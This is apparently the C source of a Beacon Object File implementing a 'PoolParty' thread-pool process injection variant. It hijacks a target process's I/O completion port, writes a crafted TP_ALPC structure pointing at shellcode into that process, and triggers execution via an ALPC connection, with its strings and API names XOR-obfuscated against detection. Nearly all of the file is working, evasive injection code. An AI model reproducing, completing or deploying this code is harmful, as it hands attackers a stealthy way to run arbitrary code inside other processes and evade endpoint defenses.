#include <windows.h>
#define PP_OPEN_PROCESS_ACCESS (PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION)
#define PP_RESOLVE_POOL_IOCP
#define PP_NEED_ALPC
#include "PoolPartyBof.h"

HANDLE m_p_hIoCompletion = NULL;

#define PORT_NAME_LENGTH 16

static const unsigned char kFmtV5FailTemp[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x6D, 0xB5, 0x01, 0x9D, 0xC2, 0x58, 0xB1, 0x2A, 0x44, 0xF4, 0x0B, 0x83, 0xC2, 0x5D, 0xE5, 0x3B, 0x0B, 0xA0, 0x0D, 0x9C, 0xD7, 0x53, 0xE3, 0x3F, 0x59, 0xAD, 0x48, 0xB0, 0xEB, 0x6C, 0xD2, 0x7E, 0x48, 0xBB, 0x06, 0x9F, 0xC2, 0x5F, 0xE5, 0x37, 0x44, 0xBA, 0x48, 0x81, 0xC8, 0x4E, 0xE5, 0x70 };
// "[-] Failed to create temporary ALPC connection port."
static const unsigned char kFmtV5FailTp[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x6D, 0xB5, 0x01, 0x9D, 0xC2, 0x58, 0xB1, 0x2A, 0x44, 0xF4, 0x09, 0x9D, 0xCB, 0x53, 0xF2, 0x3F, 0x5F, 0xB1, 0x48, 0xA5, 0xF7, 0x63, 0xD0, 0x12, 0x7B, 0x97, 0x48, 0x86, 0xCE, 0x48, 0xF9, 0x7E, 0x59, 0xB1, 0x05, 0x9E, 0xD3, 0x59, 0xB1, 0x2D, 0x43, 0xB1, 0x04, 0x9D, 0xC4, 0x53, 0xF5, 0x3B, 0x0B, 0xB7, 0x09, 0x9D, 0xCB, 0x5E, 0xF0, 0x3D, 0x40, 0xFA };
// "[-] Failed to allocate TP_ALPC with remote shellcode callback."
static const unsigned char kFmtV5FailPort[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x6D, 0xB5, 0x01, 0x9D, 0xC2, 0x58, 0xB1, 0x2A, 0x44, 0xF4, 0x0B, 0x83, 0xC2, 0x5D, 0xE5, 0x3B, 0x0B, 0xBA, 0x09, 0x9C, 0xC2, 0x58, 0xB1, 0x1F, 0x67, 0x84, 0x2B, 0xD1, 0xD7, 0x53, 0xE3, 0x2A, 0x05 };
// "[-] Failed to create named ALPC port."
static const unsigned char kApiNtAlpcCreatePort[] = { 0xE9, 0x48, 0xD0, 0x32, 0x5B, 0xB7, 0x2B, 0x83, 0xC2, 0x5D, 0xE5, 0x3B, 0x7B, 0xBB, 0x1A, 0x85, 0xA7 };
// "NtAlpcCreatePort"
static const unsigned char kApiTpAllocAlpcCompletion[] = { 0xF3, 0x4C, 0xD0, 0x32, 0x47, 0xBB, 0x0B, 0xB0, 0xCB, 0x4C, 0xF2, 0x1D, 0x44, 0xB9, 0x18, 0x9D, 0xC2, 0x48, 0xF8, 0x31, 0x45, 0xD4 };
// "TpAllocAlpcCompletion"
static const unsigned char kApiNtAlpcSetInformation[] = { 0xE9, 0x48, 0xD0, 0x32, 0x5B, 0xB7, 0x3B, 0x94, 0xD3, 0x75, 0xFF, 0x38, 0x44, 0xA6, 0x05, 0x90, 0xD3, 0x55, 0xFE, 0x30, 0x2B };
// "NtAlpcSetInformation"
static const unsigned char kApiNtAlpcConnectPort[] = { 0xE9, 0x48, 0xD0, 0x32, 0x5B, 0xB7, 0x2B, 0x9E, 0xC9, 0x52, 0xF4, 0x3D, 0x5F, 0x84, 0x07, 0x83, 0xD3, 0x3C };
// "NtAlpcConnectPort"
static const unsigned char kFmtV5Temp[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xE4, 0x4E, 0xF4, 0x3F, 0x5F, 0xB1, 0x0C, 0xD1, 0xC6, 0x1C, 0xE5, 0x3B, 0x46, 0xA4, 0x07, 0x83, 0xC6, 0x4E, 0xE8, 0x7E, 0x6A, 0x98, 0x38, 0xB2, 0x87, 0x4C, 0xFE, 0x2C, 0x5F };
// "[INFO] \tCreated a temporary ALPC port"
static const unsigned char kFmtV5Tp[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xE4, 0x4E, 0xF4, 0x3F, 0x5F, 0xB1, 0x0C, 0xD1, 0xF3, 0x6C, 0xCE, 0x1F, 0x67, 0x84, 0x2B, 0xD1, 0xD4, 0x48, 0xE3, 0x2B, 0x48, 0xA0, 0x1D, 0x83, 0xC2, 0x1C, 0xF0, 0x2D, 0x58, 0xBB, 0x0B, 0x98, 0xC6, 0x48, 0xF4, 0x3A, 0x0B, 0xA3, 0x01, 0x85, 0xCF, 0x1C, 0xE5, 0x36, 0x4E, 0xF4, 0x1B, 0x99, 0xC2, 0x50, 0xFD, 0x3D, 0x44, 0xB0, 0x0D, 0xF1 };
// "[INFO] \tCreated TP_ALPC structure associated with the shellcode"
static const unsigned char kFmtV5Port[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xE4, 0x4E, 0xF4, 0x3F, 0x5F, 0xB1, 0x0C, 0xD1, 0xD7, 0x53, 0xFE, 0x32, 0x0B, 0xA4, 0x09, 0x83, 0xD3, 0x45, 0xB1, 0x1F, 0x67, 0x84, 0x2B, 0xD1, 0xD7, 0x53, 0xE3, 0x2A };
// "[INFO] \tCreated pool party ALPC port"
static const unsigned char kFmtV5Alloc[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xE6, 0x50, 0xFD, 0x31, 0x48, 0xB5, 0x1C, 0x94, 0xC3, 0x1C, 0xC5, 0x0E, 0x74, 0x95, 0x24, 0xA1, 0xE4, 0x1C, 0xFC, 0x3B, 0x46, 0xBB, 0x1A, 0x88, 0x87, 0x55, 0xFF, 0x7E, 0x5F, 0xBC, 0x0D, 0xD1, 0xD3, 0x5D, 0xE3, 0x39, 0x4E, 0xA0, 0x48, 0x81, 0xD5, 0x53, 0xF2, 0x3B, 0x58, 0xA7, 0x52, 0xD1, 0x82, 0x4C, 0x91 };
// "[INFO] \tAllocated TP_ALPC memory in the target process: %p"
static const unsigned char kFmtV5Wrote[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xF0, 0x4E, 0xF8, 0x2A, 0x5F, 0xB1, 0x06, 0xD1, 0xD3, 0x54, 0xF4, 0x7E, 0x58, 0xA4, 0x0D, 0x92, 0xCE, 0x5D, 0xFD, 0x32, 0x52, 0xF4, 0x0B, 0x83, 0xC6, 0x5A, 0xE5, 0x3B, 0x4F, 0xF4, 0x3C, 0xA1, 0xF8, 0x7D, 0xDD, 0x0E, 0x68, 0xF4, 0x1B, 0x85, 0xD5, 0x49, 0xF2, 0x2A, 0x5E, 0xA6, 0x0D, 0xD1, 0xD3, 0x53, 0xB1, 0x2A, 0x43, 0xB1, 0x48, 0x85, 0xC6, 0x4E, 0xF6, 0x3B, 0x5F, 0xF4, 0x18, 0x83, 0xC8, 0x5F, 0xF4, 0x2D, 0x58, 0xD4 };
// "[INFO] \tWritten the specially crafted TP_ALPC structure to the target process"
static const unsigned char kFmtV5Assoc[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xE6, 0x4F, 0xE2, 0x31, 0x48, 0xBD, 0x09, 0x85, 0xC2, 0x58, 0xB1, 0x1F, 0x67, 0x84, 0x2B, 0xD1, 0xD7, 0x53, 0xE3, 0x2A, 0x0B, 0xA3, 0x01, 0x85, 0xCF, 0x1C, 0xE5, 0x36, 0x4E, 0xF4, 0x21, 0xBE, 0x87, 0x5F, 0xFE, 0x33, 0x5B, 0xB8, 0x0D, 0x85, 0xCE, 0x53, 0xFF, 0x7E, 0x5B, 0xBB, 0x1A, 0x85 };
// "[INFO] \tAssociated ALPC port with the IO completion port"
static const unsigned char kFmtV5Conn[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xE4, 0x53, 0xFF, 0x30, 0x4E, 0xB7, 0x1C, 0x94, 0xC3, 0x1C, 0xE5, 0x31, 0x0B, 0x95, 0x24, 0xA1, 0xE4, 0x1C, 0xE1, 0x31, 0x59, 0xA0, 0x48, 0x85, 0xC8, 0x1C, 0xE0, 0x2B, 0x4E, 0xA1, 0x0D, 0xD1, 0xC6, 0x1C, 0xE1, 0x3F, 0x48, 0xBF, 0x0D, 0x85 };
// "[INFO] \tConnected to ALPC port to queue a packet"
static const unsigned char kFmtV5Timeout[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xE6, 0x70, 0xC1, 0x1D, 0x0B, 0xB7, 0x07, 0x9F, 0xC9, 0x59, 0xF2, 0x2A, 0x0B, 0xA0, 0x01, 0x9C, 0xC2, 0x58, 0xB1, 0x31, 0x5E, 0xA0, 0x53, 0xD1, 0xD7, 0x5D, 0xF2, 0x35, 0x4E, 0xA0, 0x48, 0x9C, 0xC6, 0x45, 0xB1, 0x3F, 0x47, 0xA6, 0x0D, 0x90, 0xC3, 0x45, 0xB1, 0x3C, 0x4E, 0xF4, 0x19, 0x84, 0xC2, 0x49, 0xF4, 0x3A };
// "[INFO] \tALPC connect timed out; packet may already be queued"

static BOOL BuildAlpcPortName(wchar_t **outName, size_t *outTotal) {
    wchar_t prefix[32];
    wchar_t *randomLetters;
    wchar_t *portName;
    size_t prefixLength;
    size_t totalLength;

    if (outName == NULL || outTotal == NULL) {
        return FALSE;
    }
    *outName = NULL;
    *outTotal = 0;
    SeedRng();
    MSVCRT$memset(prefix, 0, sizeof(prefix));
    ObfDecBytes((unsigned char *)prefix, kAlpcPrefix, (int)sizeof(kAlpcPrefix));
    randomLetters = GenerateRandomLetters(PORT_NAME_LENGTH);
    if (randomLetters == NULL) {
        MSVCRT$memset(prefix, 0, sizeof(prefix));
        return FALSE;
    }
    prefixLength = MSVCRT$wcslen(prefix);
    totalLength = prefixLength + PORT_NAME_LENGTH + 1;
    portName = (wchar_t *)BofAlloc(totalLength * sizeof(wchar_t));
    if (portName == NULL ||
        MSVCRT$wcscpy_s(portName, totalLength, prefix) != 0 ||
        MSVCRT$wcscat_s(portName, totalLength, randomLetters) != 0) {
        BofFree(portName);
        BofFree(randomLetters);
        MSVCRT$memset(prefix, 0, sizeof(prefix));
        return FALSE;
    }
    BofFree(randomLetters);
    MSVCRT$memset(prefix, 0, sizeof(prefix));
    *outName = portName;
    *outTotal = totalLength;
    return TRUE;
}

static BOOL VariantSanityExtra(void) {
    _NtAlpcCreatePort NtAlpcCreatePort;
    HANDLE hAnon;
    HANDLE hNamed;
    NTSTATUS Ntstatus;
    wchar_t *portName;
    size_t totalLength;
    UNICODE_STRING usAlpcPortName;
    OBJECT_ATTRIBUTES AlpcObjectAttributes;
    ALPC_PORT_ATTRIBUTES AlpcPortAttributes;
    int attempt;

    NtAlpcCreatePort = (_NtAlpcCreatePort)ResolveNtdllEnc(kApiNtAlpcCreatePort, (int)sizeof(kApiNtAlpcCreatePort));
    if (NtAlpcCreatePort == NULL) {
        SANITY_FAIL(kFmtResolveFail, kFmtSuggestAlpc);
        return FALSE;
    }

    hAnon = NULL;
    Ntstatus = NtAlpcCreatePort(&hAnon, NULL, NULL);
    if (!NT_SUCCESS(Ntstatus) || hAnon == NULL) {
        SANITY_FAIL(kFmtV5FailTemp, kFmtSuggestAlpc);
        return FALSE;
    }
    KERNEL32$CloseHandle(hAnon);

    MSVCRT$memset(&AlpcPortAttributes, 0, sizeof(AlpcPortAttributes));
    AlpcPortAttributes.Flags = 0x20000;
    AlpcPortAttributes.MaxMessageLength = 328;

    for (attempt = 0; attempt < PP_NAME_RETRY; attempt++) {
        if (!BuildAlpcPortName(&portName, &totalLength)) {
            SANITY_FAIL(kFmtTriggerFail, kFmtSuggestAlpc);
            return FALSE;
        }
        usAlpcPortName.Buffer = portName;
        usAlpcPortName.Length = (USHORT)(MSVCRT$wcslen(portName) * sizeof(WCHAR));
        usAlpcPortName.MaximumLength = (USHORT)(totalLength * sizeof(WCHAR));
        MSVCRT$memset(&AlpcObjectAttributes, 0, sizeof(AlpcObjectAttributes));
        AlpcObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
        AlpcObjectAttributes.ObjectName = &usAlpcPortName;
        hNamed = NULL;
        Ntstatus = NtAlpcCreatePort(&hNamed, &AlpcObjectAttributes, &AlpcPortAttributes);
        BofFree(portName);
        if (NT_SUCCESS(Ntstatus) && hNamed != NULL) {
            KERNEL32$CloseHandle(hNamed);
            return TRUE;
        }
        if (Ntstatus != STATUS_OBJECT_NAME_COLLISION) {
            SANITY_FAIL(kFmtV5FailPort, kFmtSuggestAlpc);
            return FALSE;
        }
    }
    SANITY_FAIL(kFmtV5FailPort, kFmtSuggestAlpc);
    return FALSE;
}

static BOOL RemoteTpAlpcInsertionSetupExecution() {
    _NtAlpcCreatePort NtAlpcCreatePort;
    _TpAllocAlpcCompletion TpAllocAlpcCompletion;
    _NtAlpcSetInformation NtAlpcSetInformation;
    _NtAlpcConnectPort NtAlpcConnectPort;
    wchar_t *portName;
    size_t totalLength;
    HANDLE hTempAlpcConnectionPort = NULL;
    HANDLE hAlpcConnectionPort = NULL;
    NTSTATUS Ntstatus;
    PFULL_TP_ALPC pTpAlpc;
    PFULL_TP_ALPC pTpAlpcCopy;
    PFULL_TP_ALPC pRemoteTpAlpc;
    UNICODE_STRING usAlpcPortName;
    OBJECT_ATTRIBUTES AlpcObjectAttributes;
    ALPC_PORT_ATTRIBUTES AlpcPortAttributes;
    ALPC_PORT_ASSOCIATE_COMPLETION_PORT AlpcPortAssociateCompletionPort;
    OBJECT_ATTRIBUTES AlpcClientObjectAttributes;
    ALPC_MESSAGE ClientAlpcPortMessage;
    unsigned char pkt[8];
    int BufferLength;
    int i;
    int attempt;
    size_t szClientAlpcPortMessage;
    LARGE_INTEGER liTimeout;
    HANDLE hAlpc_;

    NtAlpcCreatePort = (_NtAlpcCreatePort)ResolveNtdllEnc(kApiNtAlpcCreatePort, (int)sizeof(kApiNtAlpcCreatePort));
    TpAllocAlpcCompletion = (_TpAllocAlpcCompletion)ResolveNtdllEnc(kApiTpAllocAlpcCompletion, (int)sizeof(kApiTpAllocAlpcCompletion));
    NtAlpcSetInformation = (_NtAlpcSetInformation)ResolveNtdllEnc(kApiNtAlpcSetInformation, (int)sizeof(kApiNtAlpcSetInformation));
    NtAlpcConnectPort = (_NtAlpcConnectPort)ResolveNtdllEnc(kApiNtAlpcConnectPort, (int)sizeof(kApiNtAlpcConnectPort));
    if (NtAlpcCreatePort == NULL || TpAllocAlpcCompletion == NULL ||
        NtAlpcSetInformation == NULL || NtAlpcConnectPort == NULL) {
        OBF_PRINT0(CALLBACK_ERROR, kFmtResolveFail);
        return FALSE;
    }

    Ntstatus = NtAlpcCreatePort(&hTempAlpcConnectionPort, NULL, NULL);
    if (!NT_SUCCESS(Ntstatus)) {
        OBF_PRINT0(CALLBACK_ERROR, kFmtV5FailTemp);
        return FALSE;
    }
    OBF_PRINT0(CALLBACK_OUTPUT, kFmtV5Temp);
    ApiPause();

    pTpAlpc = NULL;
    Ntstatus = TpAllocAlpcCompletion(&pTpAlpc, hTempAlpcConnectionPort, DummyAlpcCallback, NULL, NULL);
    if (!NT_SUCCESS(Ntstatus) || pTpAlpc == NULL) {
        OBF_PRINT0(CALLBACK_ERROR, kFmtV5FailTp);
        KERNEL32$CloseHandle(hTempAlpcConnectionPort);
        return FALSE;
    }
    OBF_PRINT0(CALLBACK_OUTPUT, kFmtV5Tp);
    ApiPause();

    pTpAlpcCopy = (PFULL_TP_ALPC)BofAlloc(sizeof(FULL_TP_ALPC));
    if (pTpAlpcCopy == NULL || !CopyLocalTpObject(pTpAlpcCopy, pTpAlpc, sizeof(FULL_TP_ALPC))) {
        BofFree(pTpAlpcCopy);
        KERNEL32$CloseHandle(hTempAlpcConnectionPort);
        OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
        return FALSE;
    }
    SanitizeTpDirect(&pTpAlpcCopy->Direct);
    SanitizeCleanupGroupMember(&pTpAlpcCopy->CleanupGroupMember);
    pTpAlpcCopy->AlpcPort = NULL;
    pTpAlpcCopy->CleanupGroupMember.Callback = m_ShellcodeAddress;

    MSVCRT$memset(&AlpcPortAttributes, 0, sizeof(AlpcPortAttributes));
    AlpcPortAttributes.Flags = 0x20000;
    AlpcPortAttributes.MaxMessageLength = 328;

    portName = NULL;
    totalLength = 0;
    hAlpcConnectionPort = NULL;
    for (attempt = 0; attempt < PP_NAME_RETRY; attempt++) {
        if (!BuildAlpcPortName(&portName, &totalLength)) {
            BofFree(pTpAlpcCopy);
            KERNEL32$CloseHandle(hTempAlpcConnectionPort);
            OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
            return FALSE;
        }
        usAlpcPortName.Buffer = portName;
        usAlpcPortName.Length = (USHORT)(MSVCRT$wcslen(portName) * sizeof(WCHAR));
        usAlpcPortName.MaximumLength = (USHORT)(totalLength * sizeof(WCHAR));
        MSVCRT$memset(&AlpcObjectAttributes, 0, sizeof(AlpcObjectAttributes));
        AlpcObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
        AlpcObjectAttributes.ObjectName = &usAlpcPortName;
        hAlpcConnectionPort = NULL;
        Ntstatus = NtAlpcCreatePort(&hAlpcConnectionPort, &AlpcObjectAttributes, &AlpcPortAttributes);
        if (NT_SUCCESS(Ntstatus) && hAlpcConnectionPort != NULL) {
            break;
        }
        BofFree(portName);
        portName = NULL;
        if (Ntstatus != STATUS_OBJECT_NAME_COLLISION) {
            BofFree(pTpAlpcCopy);
            KERNEL32$CloseHandle(hTempAlpcConnectionPort);
            OBF_PRINT0(CALLBACK_ERROR, kFmtV5FailPort);
            return FALSE;
        }
    }
    if (hAlpcConnectionPort == NULL || portName == NULL) {
        BofFree(pTpAlpcCopy);
        KERNEL32$CloseHandle(hTempAlpcConnectionPort);
        OBF_PRINT0(CALLBACK_ERROR, kFmtV5FailPort);
        return FALSE;
    }
    OBF_PRINT0(CALLBACK_OUTPUT, kFmtV5Port);
    ApiPause();

    pRemoteTpAlpc = (PFULL_TP_ALPC)KERNEL32$VirtualAllocEx(m_p_hTargetPid, NULL, sizeof(FULL_TP_ALPC), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pRemoteTpAlpc == NULL) {
        KERNEL32$CloseHandle(hAlpcConnectionPort);
        KERNEL32$CloseHandle(hTempAlpcConnectionPort);
        BofFree(portName);
        BofFree(pTpAlpcCopy);
        OBF_PRINT0(CALLBACK_ERROR, kFmtRemoteAllocFail);
        return FALSE;
    }
    OBF_PRINT1(CALLBACK_OUTPUT, kFmtV5Alloc, pRemoteTpAlpc);
    ApiPause();

    if (!KERNEL32$WriteProcessMemory(m_p_hTargetPid, pRemoteTpAlpc, pTpAlpcCopy, sizeof(FULL_TP_ALPC), NULL)) {
        KERNEL32$CloseHandle(hAlpcConnectionPort);
        KERNEL32$CloseHandle(hTempAlpcConnectionPort);
        BofFree(portName);
        BofFree(pTpAlpcCopy);
        RemoteFree(pRemoteTpAlpc);
        OBF_PRINT0(CALLBACK_ERROR, kFmtRemoteWriteFail);
        return FALSE;
    }
    BofFree(pTpAlpcCopy);
    KERNEL32$CloseHandle(hTempAlpcConnectionPort);
    OBF_PRINT0(CALLBACK_OUTPUT, kFmtV5Wrote);
    ApiPause();

    MSVCRT$memset(&AlpcPortAssociateCompletionPort, 0, sizeof(AlpcPortAssociateCompletionPort));
    AlpcPortAssociateCompletionPort.CompletionKey = pRemoteTpAlpc;
    AlpcPortAssociateCompletionPort.CompletionPort = m_p_hIoCompletion;
    Ntstatus = NtAlpcSetInformation(hAlpcConnectionPort, AlpcAssociateCompletionPortInformation, &AlpcPortAssociateCompletionPort, sizeof(ALPC_PORT_ASSOCIATE_COMPLETION_PORT));
    if (!NT_SUCCESS(Ntstatus)) {
        KERNEL32$CloseHandle(hAlpcConnectionPort);
        BofFree(portName);
        RemoteFree(pRemoteTpAlpc);
        OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
        return FALSE;
    }
    MarkPublished();
    OBF_PRINT0(CALLBACK_OUTPUT, kFmtV5Assoc);

    MSVCRT$memset(&AlpcClientObjectAttributes, 0, sizeof(AlpcClientObjectAttributes));
    AlpcClientObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);

    BufferLength = 8;
    for (i = 0; i < BufferLength; i++) {
        pkt[i] = (unsigned char)(i + 1);
    }
    MSVCRT$memset(&ClientAlpcPortMessage, 0, sizeof(ClientAlpcPortMessage));
    ClientAlpcPortMessage.PortHeader.u1.s1.DataLength = (USHORT)BufferLength;
    ClientAlpcPortMessage.PortHeader.u1.s1.TotalLength = (USHORT)(sizeof(PORT_MESSAGE) + BufferLength);
    MSVCRT$memcpy(ClientAlpcPortMessage.PortMessage, pkt, BufferLength);
    szClientAlpcPortMessage = sizeof(ClientAlpcPortMessage);

    liTimeout.QuadPart = -10000000;
    hAlpc_ = NULL;
    Ntstatus = NtAlpcConnectPort(
        &hAlpc_,
        &usAlpcPortName,
        &AlpcClientObjectAttributes,
        &AlpcPortAttributes,
        0x20000,
        NULL,
        (PPORT_MESSAGE)&ClientAlpcPortMessage,
        &szClientAlpcPortMessage,
        NULL,
        NULL,
        &liTimeout);
    KERNEL32$CloseHandle(hAlpcConnectionPort);
    if (hAlpc_ != NULL) {
        KERNEL32$CloseHandle(hAlpc_);
    }
    if (Ntstatus == STATUS_TIMEOUT || Ntstatus == STATUS_IO_TIMEOUT) {
        OBF_PRINT0(CALLBACK_OUTPUT, kFmtV5Timeout);
        BofFree(portName);
        ApiPause();
        return TRUE;
    }
    if (!NT_SUCCESS(Ntstatus)) {
        BofFree(portName);
        OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
        return FALSE;
    }
    OBF_PRINT0(CALLBACK_OUTPUT, kFmtV5Conn);
    BofFree(portName);
    ApiPause();
    return TRUE;
}

void HijackHandles() {
    m_p_hIoCompletion = HijackThreadPoolIoCompletion(m_p_hTargetPid, NULL);
    if (m_p_hIoCompletion != NULL) {
        OBF_PRINT0(CALLBACK_OUTPUT, kFmtHijackIocp);
    }
}

void Inject() {
    if (!InjectBegin()) {
        return;
    }
    HijackHandles();
    if (m_p_hIoCompletion == NULL) {
        OBF_PRINT0(CALLBACK_ERROR, kFmtHijackFail);
        InjectCleanup();
        return;
    }
    if (!InjectAllocWrite()) {
        CloseHandleSafe(&m_p_hIoCompletion);
        return;
    }
    if (!RemoteTpAlpcInsertionSetupExecution()) {
        FreeShellcodeIfUnpublished();
        CloseHandleSafe(&m_p_hIoCompletion);
        InjectCleanup();
        return;
    }
    OBF_PRINT0(CALLBACK_OUTPUT, kFmtDone);
    CloseHandleSafe(&m_p_hIoCompletion);
    InjectCleanup();
}

void go(char * args, int len) {
    PoolPartyEntry(args, len);
}
